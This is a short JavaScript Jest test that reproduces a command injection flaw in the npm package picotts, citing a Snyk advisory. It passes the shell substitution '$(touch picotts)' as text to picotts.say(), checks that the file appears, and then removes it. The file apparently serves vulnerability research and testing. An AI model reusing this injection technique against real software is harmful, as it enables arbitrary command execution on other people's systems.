//callback shoul be function error 
//https://snyk.io/vuln/SNYK-JS-PICOTTS-1078539
test("Command Injection in picotts", () => {
  	const picotts = require('picotts');
	const fs = require('fs')
	const path = './picotts'
	const sleep = require('sleep');
  
	let file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);

	picotts.say('$(touch picotts)', 'english', function(err) {
		if (!err)
			console.log('Correctly played')
	});

	sleep.sleep(5);
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
	fs.unlink(path, () =>  {});//deleting the file after creation
});